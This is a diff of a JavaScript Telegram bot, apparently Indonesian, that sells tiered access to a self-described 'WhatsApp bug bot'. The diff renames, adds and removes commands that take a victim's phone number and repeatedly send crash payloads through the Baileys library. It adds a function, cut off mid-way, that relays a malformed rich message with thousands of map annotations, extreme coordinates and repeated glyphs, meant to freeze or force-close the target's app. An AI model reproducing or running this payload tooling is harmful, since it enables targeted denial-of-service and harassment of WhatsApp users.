@@ -1,4 +1,3 @@
-//tes
 const { default: makeWASocket, useMultiFileAuthState, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, jidDecode, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys');
 const fs = require("fs-extra");
 const JsConfuser = require("js-confuser");
@@ -491,7 +490,7 @@ Script Bot WhatsApp — Gunakan secara bijak dan bertanggung jawab.
 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏
 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : PERFECT
 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 0.5
-𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @Jerroffc
+𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @ridzzhalutrs
 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : PRIVATE AKSES
 
 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝙄𝙎𝙏𝙀𝙈
@@ -520,7 +519,7 @@ Pilih Button di bawah ini ↯
           { text: "𝗦𝗖𝗥𝗜𝗣𝗧 𝗣𝗥𝗜𝗖𝗜𝗡𝗚", callback_data: "harga", style: "primary", icon_custom_emoji_id: "5409048419211682843" },
          ],
          [
-          { text: "𝗖𝗛𝗔𝗡𝗡𝗘𝗟", url: "https://t.me/Jerroffc", style: "danger", icon_custom_emoji_id: "6269255258212404947" }
+          { text: "𝗖𝗛𝗔𝗡𝗡𝗘𝗟", url: "https://t.me/Fuckyaetim", style: "danger", icon_custom_emoji_id: "6269255258212404947" }
          ]
         ]
     }
@@ -558,12 +557,9 @@ bot.on("callback_query", async (query) => {
 <i>Daftar command dan informasi fitur yang tersedia.</i>
 
 ┏━━⪼ [ <b>BUG ⌂ MENU</b> ]
-┃ <b>𖤓 /delayhard — 628xx</b>
-┃ <i>⤷ Perfect Delay</i>
-┃ <b>𖤓 /force — 628xx</b>
-┃ <i>⤷ Forclose Click</i>
-┃ <b>𖤓 /xhard — 628xx</b>
-┃ <i>⤷ Blank Hard</i>
+┃ <b>𖤓 /delayhard — 628xx [ DELAY HARD ]</b>
+┃ <b>𖤓 /test — 628xx [ FORCLOSE ]</b>
+┃ <b>𖤓 /test — 628xx [ BAN WA ]</b>
 ┗━━━━━━━━━━━━━━━━━━⪼
 
 <i>✧ Use responsibly. Stay informed.</i>
@@ -580,7 +576,6 @@ bot.on("callback_query", async (query) => {
 ┏━━〔 <b>ACCESS MENU</b> 〕
 ┃ 𖤓 /addbot     — Tambah sender
 ┃ 𖤓 /setcd      — Atur cooldown
-┃ 𖤓 /update     — Update script
 ┃ 𖤓 /addprem    — Tambah premium
 ┃ 𖤓 /addadmin   — Tambah admin
 ┃ 𖤓 /deladmin   — Hapus admin
@@ -597,8 +592,8 @@ bot.on("callback_query", async (query) => {
       caption = `
 <blockquote>✦ 𝙋𝙀𝙍𝙁𝙀𝘾𝙏 — 𝙎𝘾𝙍𝙄𝙋𝙏 𝙋𝙍𝙄𝘾𝙀
 Gunakan script secara bijak dan bertanggung jawab.
-
 ┏━━⪼ [ 𝗦𝗖𝗥𝗜𝗣𝗧 ⌂ 𝗣𝗥𝗜𝗖𝗜𝗡𝗚 ]
+┃
 ┃ <b>⋅𖤓⋅ FULL UP : Rp5.000</b>
 ┃ <b>⋅𖤓⋅ RESS SC : Rp10.000</b>
 ┃ <b>⋅𖤓⋅ PARTNER SC : Rp15.000</b>
@@ -607,9 +602,10 @@ Gunakan script secara bijak dan bertanggung jawab.
 ┃ <b>⋅𖤓⋅ PERFECT STAFF : Rp45.000</b>
 ┃ <b>⋅𖤓⋅ PERFECT ADMIN : Rp55.000</b>
 ┃ <b>⋅𖤓⋅ DEVELOPER : Rp80.000</b>
+┃
 ┃ ─────────────────
 ┃ <b>⋅𖤓⋅ PEMBELIAN & AKSES</b>
-┃ Hubungi: @ridzzhalutrs / @Jerroffc
+┃ Hubungi: @ridzzhalutrs
 ┗━━━━━━━━━━━━━━━━━━⪼
 
 <b>PERFECT</b> — <i>EST. 2025</i></blockquote>
@@ -623,7 +619,6 @@ Gunakan script secara bijak dan bertanggung jawab.
 <i>Appreciation for everyone behind the project.</i>
 
 ┏━━〔 <b>THANKS TO</b> 〕
-┃ ✧ @Jerroffc     <i>[ Developer ]</i>
 ┃ ✧ @ridzzhalutrs     <i>[ Developer ]</i>
 ┗━━━━━━━━━━━━━━━━━━
 
@@ -635,13 +630,13 @@ Gunakan script secara bijak dan bertanggung jawab.
 
     if (query.data === "about") {
       caption = `
-<blockquote>✦ 𝘼𝙇𝙏𝙃𝙀𝙍𝘼 — 𝘼𝘽𝙊𝙐𝙏 𝙐𝙎
+<blockquote>✦ <b>ALTHERA — ABOUT US</b>
 <b>Althera</b> is a WhatsApp bug bot project developed by a team, with the goal of delivering bugs to targets.
 
 ┏━━〔 <b>ABOUT THE PROJECT</b> 〕
 ┃ 𖤓 <b>Project</b> : PERFECT
 ┃ 𖤓 <b>Category</b> : WhatsApp bug bot 
-┃ 𖤓 <b>Developer</b> : @Jerroffc ＆ <a href="tg://user?id=6213349853">@ridzz</a>
+┃ 𖤓 <b>Developer</b> : @Fuckyatim and @baba
 ┗━━━━━━━━━━━━━━━━━━
 
 ✧ <i>Simple. Perfect. Continuously evolving.</i>
@@ -652,7 +647,7 @@ Gunakan script secara bijak dan bertanggung jawab.
 
     if (query.data === "tools") {
       caption = `
-<blockquote>✦ 𝘼𝙇𝙏𝙃𝙀𝙍𝘼 — 𝙏𝙊𝙊𝙇𝙎 & 𝙐𝙏𝙄𝙇𝙄𝙏𝙄𝙀𝙎
+<blockquote><b>✦ ALTHERA — TOOLS & UTILITIES</b>
 <i>Kumpulan fitur dan utilitas untuk kebutuhanmu.</i>
 
 ┏━━〔 <b>TOOLS MENU</b> 〕
@@ -681,7 +676,7 @@ Gunakan script secara bijak dan bertanggung jawab.
 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏
 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : PERFECT
 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 0.5
-𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @Jerroffc
+𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @ridzzhalutrs
 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : PRIVATE AKSES
 
 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝙄𝙎𝙏𝙀𝙈
@@ -699,16 +694,16 @@ Pilih Button di bawah ini ↯
          { text: "𝗕𝗨𝗚 𝗠𝗘𝗡𝗨", callback_data: "bug_show", style: "danger", icon_custom_emoji_id: "5893257006323603821" },
          ],
          [
-         { text: "ⓘ", callback_data: "about", style: "primary", icon_custom_emoji_id: "4971994935172531040" },
+         { text: "ⓘ", callback_data: "back_to_main", style: "primary", icon_custom_emoji_id: "4971994935172531040" },
           { text: "✧", callback_data: "tqto", style: "success", icon_custom_emoji_id: "4936468614967460670" },
-          { text: "⛭", callback_data: "tools", style: "primary", icon_custom_emoji_id: "4971994935172531040" },
+          { text: "⛭", callback_data: "back_to_main", style: "primary", icon_custom_emoji_id: "4971994935172531040" },
          ],
          [
           { text: "𝗔𝗖𝗖𝗘𝗦 𝗠𝗘𝗡𝗨", callback_data: "akses", style: "primary", icon_custom_emoji_id: "5420323339723881652" },
           { text: "𝗦𝗖𝗥𝗜𝗣𝗧 𝗣𝗥𝗜𝗖𝗜𝗡𝗚", callback_data: "harga", style: "primary", icon_custom_emoji_id: "5409048419211682843" },
          ],
          [
-          { text: "𝗖𝗛𝗔𝗡𝗡𝗘𝗟", url: "https://t.me/Jerroffc", style: "danger", icon_custom_emoji_id: "6269255258212404947" }
+          { text: "𝗖𝗛𝗔𝗡𝗡𝗘𝗟", url: "https://t.me/Fuckyaetim", style: "danger", icon_custom_emoji_id: "6269255258212404947" }
          ]
         ]
       };
@@ -739,7 +734,7 @@ Pilih Button di bawah ini ↯
 
 
 //=======CASE BUG=========//
-bot.onText(/\/HoxterFc (\d+)/, async (msg, match) => {
+bot.onText(/\/delayhard (\d+)/, async (msg, match) => {
   const chatId = msg.chat.id;
   const senderId = msg.from.id;
   const targetNumber = match[1];
@@ -787,7 +782,7 @@ if (remainingTime > 0) {
     const sentMessage = await bot.sendPhoto(chatId, "https://ibb.co.com/39TLHrck", {
       caption: `
 \`\`\`
-- HoxterFc
+- delayhard
 ╰➤ Target : ${formattedNumber}
 ╰➤ Status : Mengirim bug...
 ╰➤ Progres : [░░░░░░░░░░] 0%
@@ -811,7 +806,7 @@ if (remainingTime > 0) {
       await new Promise(resolve => setTimeout(resolve, stage.delay));
       await bot.editMessageCaption(`
 \`\`\`
-- HoxterFc
+- delayhard
 ╰➤ Target : ${formattedNumber}
 ╰➤ Status : Memproses...
  ${stage.text}
@@ -820,18 +815,17 @@ if (remainingTime > 0) {
     }
 
     // Eksekusi bug setelah progres selesai
-    for (let i = 0; i <= 50; i++) {   
-    await JawaTimurIsBack(sock, target);
-    await CrashJnvible(sock, target);
-    await JawaTimurForcloseRelog(sock, target);
-   const delay = ms => new Promise(res => setTimeout(1500));
+    for (let i = 0; i <= 12; i++) {   
+   await BlankScreen(sock, target);
+   await delayhardinvisible(sock, target);
+   const delay = ms => new Promise(res => setTimeout(45000));
 }
     console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
     
     // Update ke sukses + tombol cek target
     await bot.editMessageCaption(`
 \`\`\`
-- HoxterFc
+- delayhard
 ╰➤ Target : ${formattedNumber}
 ╰➤ Status : Sukses!
 ╰➤ Progres : [██████████] 100%
@@ -850,7 +844,7 @@ if (remainingTime > 0) {
   }
 });
 
-bot.onText(/\/HoxterCrash (\d+)/, async (msg, match) => {
+bot.onText(/\/force (\d+)/, async (msg, match) => {
   const chatId = msg.chat.id;
   const senderId = msg.from.id;
   const targetNumber = match[1];
@@ -898,7 +892,7 @@ if (remainingTime > 0) {
     const sentMessage = await bot.sendPhoto(chatId, "https://ibb.co.com/39TLHrck", {
       caption: `
 \`\`\`
-- HoxterCrash
+- delayhard
 ╰➤ Target : ${formattedNumber}
 ╰➤ Status : Mengirim bug...
 ╰➤ Progres : [░░░░░░░░░░] 0%
@@ -922,7 +916,7 @@ if (remainingTime > 0) {
       await new Promise(resolve => setTimeout(resolve, stage.delay));
       await bot.editMessageCaption(`
 \`\`\`
-- HoxterCrash
+- delayhard
 ╰➤ Target : ${formattedNumber}
 ╰➤ Status : Memproses...
  ${stage.text}
@@ -931,17 +925,16 @@ if (remainingTime > 0) {
     }
 
     // Eksekusi bug setelah progres selesai
-    for (let i = 0; i <= 50; i++) {   
-    await CrashUi(sock, target);
-    await CrashJnvible(sock, target);
-   const delay = ms => new Promise(res => setTimeout(1500));
+    for (let i = 0; i <= 1; i++) {   
+   await bowo(sock, target);
+   const delay = ms => new Promise(res => setTimeout(1000));
 }
     console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
     
     // Update ke sukses + tombol cek target
     await bot.editMessageCaption(`
 \`\`\`
-- HoxterCrash 
+- delayhard
 ╰➤ Target : ${formattedNumber}
 ╰➤ Status : Sukses!
 ╰➤ Progres : [██████████] 100%
@@ -960,7 +953,7 @@ if (remainingTime > 0) {
   }
 });
 
-bot.onText(/\/BlankHxt (\d+)/, async (msg, match) => {
+bot.onText(/\/delayX (\d+)/, async (msg, match) => {
   const chatId = msg.chat.id;
   const senderId = msg.from.id;
   const targetNumber = match[1];
@@ -1008,7 +1001,7 @@ if (remainingTime > 0) {
     const sentMessage = await bot.sendPhoto(chatId, "https://ibb.co.com/39TLHrck", {
       caption: `
 \`\`\`
-- BlankDvloids
+- delayhard
 ╰➤ Target : ${formattedNumber}
 ╰➤ Status : Mengirim bug...
 ╰➤ Progres : [░░░░░░░░░░] 0%
@@ -1032,7 +1025,7 @@ if (remainingTime > 0) {
       await new Promise(resolve => setTimeout(resolve, stage.delay));
       await bot.editMessageCaption(`
 \`\`\`
-- BlankDvloids
+- delayhard
 ╰➤ Target : ${formattedNumber}
 ╰➤ Status : Memproses...
  ${stage.text}
@@ -1041,17 +1034,16 @@ if (remainingTime > 0) {
     }
 
     // Eksekusi bug setelah progres selesai
-    for (let i = 0; i <= 50; i++) {   
-   await JawaTimurBlankOld(sock, target)
-   await BlankXDelay(sock, target);
-   const delay = ms => new Promise(res => setTimeout(1500));
+    for (let i = 0; i <= 3; i++) {   
+   await Skylinne(sock, target);
+   const delay = ms => new Promise(res => setTimeout(12000));
 }
     console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
     
     // Update ke sukses + tombol cek target
     await bot.editMessageCaption(`
 \`\`\`
-- BlankDvloids
+- delayhard
 ╰➤ Target : ${formattedNumber}
 ╰➤ Status : Sukses!
 ╰➤ Progres : [██████████] 100%
@@ -1070,7 +1062,7 @@ if (remainingTime > 0) {
   }
 });
 
-bot.onText(/\/HoxterVip (\d+)/, async (msg, match) => {
+bot.onText(/\/perfectblank (\d+)/, async (msg, match) => {
   const chatId = msg.chat.id;
   const senderId = msg.from.id;
   const targetNumber = match[1];
@@ -1118,7 +1110,7 @@ if (remainingTime > 0) {
     const sentMessage = await bot.sendPhoto(chatId, "https://ibb.co.com/39TLHrck", {
       caption: `
 \`\`\`
-- exitusvip
+- delayhard
 ╰➤ Target : ${formattedNumber}
 ╰➤ Status : Mengirim bug...
 ╰➤ Progres : [░░░░░░░░░░] 0%
@@ -1142,7 +1134,7 @@ if (remainingTime > 0) {
       await new Promise(resolve => setTimeout(resolve, stage.delay));
       await bot.editMessageCaption(`
 \`\`\`
-- exitusvip
+- delayhard
 ╰➤ Target : ${formattedNumber}
 ╰➤ Status : Memproses...
  ${stage.text}
@@ -1151,345 +1143,17 @@ if (remainingTime > 0) {
     }
 
     // Eksekusi bug setelah progres selesai
-    for (let i = 0; i <= 50; i++) {   
-   await JawaTimurForcloseRelog(sock, target);
-   await CrashUi(sock, target);
-   await CrashJnvible(sock, target);
-   const delay = ms => new Promise(res => setTimeout(1500));
+    for (let i = 0; i <= 3; i++) {   
+   await BlankScreen(sock, target);
+   await blank(sock, target);
+   const delay = ms => new Promise(res => setTimeout(2000));
 }
     console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
     
     // Update ke sukses + tombol cek target
     await bot.editMessageCaption(`
 \`\`\`
-- exitusvip
-╰➤ Target : ${formattedNumber}
-╰➤ Status : Sukses!
-╰➤ Progres : [██████████] 100%
-\`\`\`
-`, {
-      chat_id: chatId,
-      message_id: sentMessage.message_id,
-      parse_mode: "Markdown",
-      reply_markup: {
-        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
-      }
-    });
-
-  } catch (error) {
-    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
-  }
-});
-
-bot.onText(/\/xspam (\d+)/, async (msg, match) => {
-  const chatId = msg.chat.id;
-  const senderId = msg.from.id;
-  const targetNumber = match[1];
-  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
-  const jid = `${formattedNumber}@s.whatsapp.net`;
-  const randomImage = getRandomImage();
-  const target = jid;
-
-if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
-  return bot.sendPhoto(chatId, randomImage, {
-    caption: `\`\`\`Эта функция доступна только пользователям премиум-класса.\`\`\`
-┏━━━━━━━━━━━━━━━━━━┓
-<b>✦ 𝐀𝐋𝐓𝐇𝐄𝐑𝐀 — 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐀𝐂𝐂𝐄𝐒𝐒</b>
-┗━━━━━━━━━━━━━━━━━━┛
-
-𖤓 Interested in accessing the script?
-Contact the owner below.
-
-↳ <b>Owner:</b> @Fuckyatim
-
-<b>PERFECT</b> — <i>EST. 2025</i>`,
-    parse_mode: "Markdown",
-    reply_markup: {
-      inline_keyboard: [
-        [{ text: "Contact Owner ", url: "https://t.me/Fuckyatim" }],
-      ]
-    }
-  });
-}
-
-const remainingTime = checkCooldown(msg.from.id);
-if (remainingTime > 0) {
-  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
-}
-
-  try {
-    if (sessions.size === 0) {
-      return bot.sendMessage(
-        chatId,
-        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
-      );
-    }
-
-    // Kirim gambar + caption pertama
-    const sentMessage = await bot.sendPhoto(chatId, "https://ibb.co.com/39TLHrck", {
-      caption: `
-\`\`\`
-- xspam
-╰➤ Target : ${formattedNumber}
-╰➤ Status : Mengirim bug...
-╰➤ Progres : [░░░░░░░░░░] 0%
-\`\`\`
-`, parse_mode: "Markdown"
-    });
-
-    // Progress bar bertahap
-  const progressStages = [
-      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
-      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
-      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
-      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
-      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
-      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
-    ];
-
-
-    // Jalankan progres bertahap
-    for (const stage of progressStages) {
-      await new Promise(resolve => setTimeout(resolve, stage.delay));
-      await bot.editMessageCaption(`
-\`\`\`
-- xspam
-╰➤ Target : ${formattedNumber}
-╰➤ Status : Memproses...
- ${stage.text}
-\`\`\`
-`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
-    }
-
-    // Eksekusi bug setelah progres selesai
-    for (let i = 0; i <= 50; i++) {   
-    await delayspam(sock, target);
-   const delay = ms => new Promise(res => setTimeout(1500));
-}
-    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
-    
-    // Update ke sukses + tombol cek target
-    await bot.editMessageCaption(`
-\`\`\`
-- xspam
-╰➤ Target : ${formattedNumber}
-╰➤ Status : Sukses!
-╰➤ Progres : [██████████] 100%
-\`\`\`
-`, {
-      chat_id: chatId,
-      message_id: sentMessage.message_id,
-      parse_mode: "Markdown",
-      reply_markup: {
-        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
-      }
-    });
-
-  } catch (error) {
-    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
-  }
-});
-
-bot.onText(/\/delayvloid (\d+)/, async (msg, match) => {
-  const chatId = msg.chat.id;
-  const senderId = msg.from.id;
-  const targetNumber = match[1];
-  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
-  const jid = `${formattedNumber}@s.whatsapp.net`;
-  const randomImage = getRandomImage();
-  const target = jid;
-
-if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
-  return bot.sendPhoto(chatId, randomImage, {
-    caption: `\`\`\`Эта функция доступна только пользователям премиум-класса.\`\`\`
-┏━━━━━━━━━━━━━━━━━━┓
-<b>✦ 𝐀𝐋𝐓𝐇𝐄𝐑𝐀 — 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐀𝐂𝐂𝐄𝐒𝐒</b>
-┗━━━━━━━━━━━━━━━━━━┛
-
-𖤓 Interested in accessing the script?
-Contact the owner below.
-
-↳ <b>Owner:</b> @Fuckyatim
-
-<b>PERFECT</b> — <i>EST. 2025</i>`,
-    parse_mode: "Markdown",
-    reply_markup: {
-      inline_keyboard: [
-        [{ text: "Contact Owner ", url: "https://t.me/Fuckyatim" }],
-      ]
-    }
-  });
-}
-
-const remainingTime = checkCooldown(msg.from.id);
-if (remainingTime > 0) {
-  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
-}
-
-  try {
-    if (sessions.size === 0) {
-      return bot.sendMessage(
-        chatId,
-        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
-      );
-    }
-
-    // Kirim gambar + caption pertama
-    const sentMessage = await bot.sendPhoto(chatId, "https://ibb.co.com/39TLHrck", {
-      caption: `
-\`\`\`
-- delayvloid
-╰➤ Target : ${formattedNumber}
-╰➤ Status : Mengirim bug...
-╰➤ Progres : [░░░░░░░░░░] 0%
-\`\`\`
-`, parse_mode: "Markdown"
-    });
-
-    // Progress bar bertahap
-  const progressStages = [
-      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
-      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
-      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
-      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
-      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
-      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
-    ];
-
-
-    // Jalankan progres bertahap
-    for (const stage of progressStages) {
-      await new Promise(resolve => setTimeout(resolve, stage.delay));
-      await bot.editMessageCaption(`
-\`\`\`
-- delayvloid
-╰➤ Target : ${formattedNumber}
-╰➤ Status : Memproses...
- ${stage.text}
-\`\`\`
-`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
-    }
-
-    // Eksekusi bug setelah progres selesai
-    for (let i = 0; i <= 50; i++) {   
-   await DelayInvisBapakLowh(sock, target);
-   const delay = ms => new Promise(res => setTimeout(1500));
-}
-    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
-    
-    // Update ke sukses + tombol cek target
-    await bot.editMessageCaption(`
-\`\`\`
-- delayvloid
-╰➤ Target : ${formattedNumber}
-╰➤ Status : Sukses!
-╰➤ Progres : [██████████] 100%
-\`\`\`
-`, {
-      chat_id: chatId,
-      message_id: sentMessage.message_id,
-      parse_mode: "Markdown",
-      reply_markup: {
-        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
-      }
-    });
-
-  } catch (error) {
-    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
-  }
-});
-
-bot.onText(/\/delayinvis (\d+)/, async (msg, match) => {
-  const chatId = msg.chat.id;
-  const senderId = msg.from.id;
-  const targetNumber = match[1];
-  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
-  const jid = `${formattedNumber}@s.whatsapp.net`;
-  const randomImage = getRandomImage();
-  const target = jid;
-
-if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
-  return bot.sendPhoto(chatId, randomImage, {
-    caption: `\`\`\`Эта функция доступна только пользователям премиум-класса.\`\`\`
-┏━━━━━━━━━━━━━━━━━━┓
-<b>✦ 𝐀𝐋𝐓𝐇𝐄𝐑𝐀 — 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐀𝐂𝐂𝐄𝐒𝐒</b>
-┗━━━━━━━━━━━━━━━━━━┛
-
-𖤓 Interested in accessing the script?
-Contact the owner below.
-
-↳ <b>Owner:</b> @Fuckyatim
-
-<b>PERFECT</b> — <i>EST. 2025</i>`,
-    parse_mode: "Markdown",
-    reply_markup: {
-      inline_keyboard: [
-        [{ text: "Contact Owner ", url: "https://t.me/Fuckyatim" }],
-      ]
-    }
-  });
-}
-
-const remainingTime = checkCooldown(msg.from.id);
-if (remainingTime > 0) {
-  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
-}
-
-  try {
-    if (sessions.size === 0) {
-      return bot.sendMessage(
-        chatId,
-        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
-      );
-    }
-
-    // Kirim gambar + caption pertama
-    const sentMessage = await bot.sendPhoto(chatId, "https://ibb.co.com/39TLHrck", {
-      caption: `
-\`\`\`
-- delayinvis
-╰➤ Target : ${formattedNumber}
-╰➤ Status : Mengirim bug...
-╰➤ Progres : [░░░░░░░░░░] 0%
-\`\`\`
-`, parse_mode: "Markdown"
-    });
-
-    // Progress bar bertahap
-  const progressStages = [
-      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
-      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
-      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
-      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
-      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
-      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
-    ];
-
-
-    // Jalankan progres bertahap
-    for (const stage of progressStages) {
-      await new Promise(resolve => setTimeout(resolve, stage.delay));
-      await bot.editMessageCaption(`
-\`\`\`
-- delayinvis
-╰➤ Target : ${formattedNumber}
-╰➤ Status : Memproses...
- ${stage.text}
-\`\`\`
-`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
-    }
-
-    // Eksekusi bug setelah progres selesai
-    for (let i = 0; i <= 50; i++) {   
-   await DelayInvisBapakLowh(sock, target);
-   const delay = ms => new Promise(res => setTimeout(1500));
-}
-    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
-    
-    // Update ke sukses + tombol cek target
-    await bot.editMessageCaption(`
-\`\`\`
-- delayinvis
+- delayhard
 ╰➤ Target : ${formattedNumber}
 ╰➤ Status : Sukses!
 ╰➤ Progres : [██████████] 100%
@@ -1590,8 +1254,9 @@ if (remainingTime > 0) {
 
     // Eksekusi bug setelah progres selesai
     for (let i = 0; i <= 12; i++) {   
+   await ingpisdenglay(sock, target);
    await delayhardinvisible(sock, target);
-   const delay = ms => new Promise(res => setTimeout(40000));
+   const delay = ms => new Promise(res => setTimeout(45000));
 }
     console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
     
@@ -1618,6 +1283,629 @@ if (remainingTime > 0) {
 });
 
 // /TEMPAT FUNC DISINI ///
+// forclose
+async function bowo(sock, target) {
+const label = "Gimana kabarnya sekarang?";
+await sock.relayMessage(target, {
+   botForwardedMessage: {
+      message: {
+        richResponseMessage: {
+        mapMetadata: {
+        centerLatitude: 99999e10,
+        centerLongitude: -99999e10,
+        latitudeDelta: 99999e99,
+        longitudeDelta: 99999e99,
+        showInfoList: true,
+        annotations: Array.from({length: 5000}, (_, i) => ({
+          annotationNumber: i,
+          latitude: 99999e10,
+          longitude: -99999e10,
+          title: "ꦽ".repeat(500),
+          body: "ꦽ".repeat(500)
+           }))
+          },
+          messageType: 1,
+          submessages: [
+            {
+              messageType: 8,
+              latexMetadata: {
+                text: label,
+                expressions: [
+                  {
+                    latexExpression: label,
+                    url: "https://t.me/Jangansoasikdeh",
+                    height: 99999999,
+                    fontHeight: 1,
+                  },
+                ],
+              },
+            },
+          ],
+          contextInfo: {
+            forwardingScore: 99999,
+            isForwarded: true,
+            forwardedAiBotMessageInfo: {
